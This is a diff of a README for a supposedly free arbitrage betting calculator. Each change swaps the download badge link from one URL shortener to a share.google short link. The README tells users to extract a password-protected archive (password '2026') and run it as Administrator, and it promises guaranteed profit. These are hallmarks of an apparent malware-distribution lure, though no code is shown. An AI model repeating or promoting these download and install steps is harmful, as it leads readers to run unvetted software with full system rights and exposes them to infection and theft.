@@ -9,7 +9,7 @@ The **📊 Arbitrage Betting Calculator** is a **free** professional tool that i
 
 <div align="center">
 
-[![Download Arbitrage Betting Calculator](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/arbitrage-bet-calculator-free)
+[![Download Arbitrage Betting Calculator](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/0p46FXQ8psFrFkVU1)
 
 </div>
 
@@ -111,7 +111,7 @@ The **📊 Arbitrage Betting Calculator** is a **free** professional tool that i
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Complete setup → Launch
 
-[![Download Arbitrage Betting Calculator](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/arbitrage-bet-calculator-free)
+[![Download Arbitrage Betting Calculator](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/0p46FXQ8psFrFkVU1)
 
 ### Detailed Installation (May 2026 Update)
 
@@ -272,7 +272,7 @@ Find guaranteed profit opportunities for free. **Arbitrage Betting Calculator** 
 
 <div align="center">
 
-[![Download Arbitrage Betting Calculator](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/arbitrage-bet-calculator-free)
+[![Download Arbitrage Betting Calculator](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/0p46FXQ8psFrFkVU1)
 
 **Version 4.6.1** — Free arbitrage calculator. May 2026 update. Zero cost. No payment.
 
